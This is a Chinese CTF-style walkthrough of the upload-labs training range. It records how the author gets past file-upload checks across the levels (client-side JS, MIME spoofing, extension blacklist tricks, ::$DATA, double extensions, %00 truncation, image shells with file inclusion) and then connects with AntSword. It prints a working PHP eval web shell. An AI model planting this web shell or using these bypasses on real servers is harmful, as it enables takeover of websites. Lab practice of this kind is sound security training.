# 文件上传漏洞  upload-labs靶场合集

## Pass-01 (前端验证)

上传一句话代码的php文件

```
<?php
    @eval($_POST['shell']);
?>
```

将js代码复制到控制台进行修改，强迫调用两次checkFile函数

![](assets/1726562475400.png)

则文件上传成功，如下：

![](assets/1726562530045.png)

使用蚁剑连接

![](assets/1726562646746.png)

原url+文件路径地址，连接密码则是一句话木马里POST中的内容=> shell

![](assets/1726562661475.png)

可直接查看源文件

## Pass-02(MIME验证)

![](assets/1726643907310.png)

代码审计：

​	属于MIME验证

​	MIME类型用来设定某种拓展名文件的打开方式，如GIF图片MIME为image/gif,CSS文件为text/css.

考虑使用burpsuite抓包

将php文件先修改成jpg文件，在上传时使用bp拦截，在bp中将后缀修改为php

![](assets/1726562740849.png)

放包后可以看到上传成功

![](assets/1726562791534.png)

用蚁剑连接可以看到成功向源文件夹注入了shell.php这个木马

![](assets/1726562825617.png)

## Pass-03(黑名单验证，特殊后缀)

试探性地上传了shell.php，报错如下

![](assets/1726562861688.png)

文件被检查了拓展名，存在黑名单，禁止了这四类文件的上传

使用bp抓包，在bp中修改php的后缀名为php1绕过，后`放包`

![](assets/1726562903385.png)

> 注意：此时文件名更改了

![](assets/1726562934058.png)



## Pass-04(黑名单验证)

![](assets/1726564572485.png)

代码审计：

​	很明显是黑名单验证，发现没有过滤掉htaccess文件（可以利用这个）

同样使用bp抓包，利用Windows特性xxx.php. .

![](assets/1726563869909.png)

蚁剑连接

![](assets/1726563938199.png)
可以看到我们刚才上传的php文件，说明上传成功

## Pass-05(黑名单验证)

![](assets/1726564119791.png)

代码审计:

​	发现同样是黑名单，且过滤掉了php\pHp\htaccess等各种后缀的文件

感觉还是可以利用Windows特性绕过黑名单

![](assets/1726564271050.png)

连接蚁剑，可以看到刚才上传的php文件

![](assets/1726564367861.png)

## Pass-06

![](assets/1726564656276.png)

代码审计：

​	依旧是黑名单验证，但是没有strtolower()函数，因此可以利用大小写绕过

![](assets/1726564774213.png)

连接蚁剑看看：

![](assets/1726564917012.png)

报错原因不明。。。我也不知道为啥会报错

## Pass-07

![](assets/1726565177357.png)

代码审计：

​	黑名单验证，但是没有首尾去空

搜到说可以在文件名后面添加一个空格绕过，但是试了一下，不行诶，暂时保留吧

## Pass-08

![](assets/1726565708044.png)

代码审计：

​	这一关没有用deldot删去末尾的点，因此利用这个漏洞绕过

![](assets/1726565768747.png)

蚁剑连接:

![](assets/1726565809172.png)

## Pass-09

![](assets/1726565834701.png)

代码审计：

​	没有去除字符串的str_ireplace()函数，因此这道题应该是使用::$DATA绕过

**php在window的时候如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持"::$DATA"之前的文件名 他的目的就是不检查后缀名。**

![](assets/1726566323319.png)

蚁剑连接：

![](assets/1726566385248.png)

## Pass-10

![](assets/1726644942866.png)

代码审计：

​	最后文件上传直接用路径名进行拼接，并且只对文件名进行过滤

​	deldot从后往前删除末尾的点，但是遇到空格会暂停

上传php文件到bp，在进行修改=>shell.php. .

> 构造Payload:../upload/shell.php.  .

再连接蚁剑即可

![](assets/1726646660337.png)

## Pass-11

![](assets/1726647220742.png)

代码审计:

​	黑名单验证；str_ireplace函数会过滤掉文件后缀名，替换为空字符串；

利用双写绕过

> 构造Payload: shell.pphphp

![](assets/1726648015059.png)

上传结果如上，可以看到虽然在bp中改为pphphp，但是后缀还是php

连接蚁剑：

不知道为啥连接蚁剑之后，能连上，但是看不到上传的文件。。。。

## Pass-12

![](assets/1726643907310.png)

代码审计：

​	白名单验证；利用%00截断可以绕过白名单限制

利用bp抓包

![72665132118](assets/1726651321181.png)

不成功，不知道为啥

## Pass-14

![72674936720](assets/1726749367200.png)

题目已经明确告诉我们要使用文件包含漏洞和图片马，图片包含漏洞的页面就在include.php

![72674943890](assets/1726749438902.png)

![72675266117](assets/1726752661170.png)

代码审计：

​	很简单，参数放在file；

​	这一关会读取前两个字节，@unpack函数用于从二进制中解包数据，且后端会根据上传的文件重命名

补充知识：
1.Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG。
2.Jpg图片文件包括2字节：FF D8。
3.Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。
4.Bmp图片文件包括2字节：42 4D。即为 BM。

上传一个图片马

> 图片马生成方法有很多，下面尝试三种图片马，看看能不能都得到同样的结果
>
> 第一种是使用cmd制作图片马

![72674965465](assets/1726749654659.png)

![72674987554](assets/1726749875549.png)

连接成功！！！

> 第二种是直接在图片文字文件中添加一句话木马

![72675000632](assets/1726750006320.png)

保存后直接使用看看

奇怪。。。不行，即便后缀在白名单中，也上传不上去。。。服了

> 也可以使用bp抓包，然后注入一句话木马

也尝试过，还是失败了。。。

## Pass-15

![72675084277](assets/1726750842772.png)

同样类型的题目，也是利用文件包含+图片马解题

![72675268692](assets/1726752686922.png)

代码审计：

​	代码通过getimagesize函数判断图片大小

![72675088217](assets/1726750882179.png)

同样的文件包含界面

上传一个cmd做的png图片马

![72675325415](assets/1726753254159.png)

然而解析失败，蚁剑自然也无法连接上，不知道原因

又尝试了用shshell,jpg这个图片马，发现可以解析？？！！同样被重命名为jpeg图片

![72675341675](assets/1726753416754.png)

连接蚁剑：连接成功

![72675344520](assets/1726753445209.png)

## Pass-16

![72675354789](assets/1726753547893.png)

仍然是图片马+文件包含+文件上传的题目

代码审计：

​	exif_imagetype函数用于判断一个图像的类型，读取一个图像的第一个字节并检查其签名。同样没有限制使用图片马，还是用上面两关的方法通过

![72675450460](assets/1726754504606.png)

解析图片成功后，使用蚁剑连接：

![72675459631](assets/1726754596310.png)

连接失败？？？




































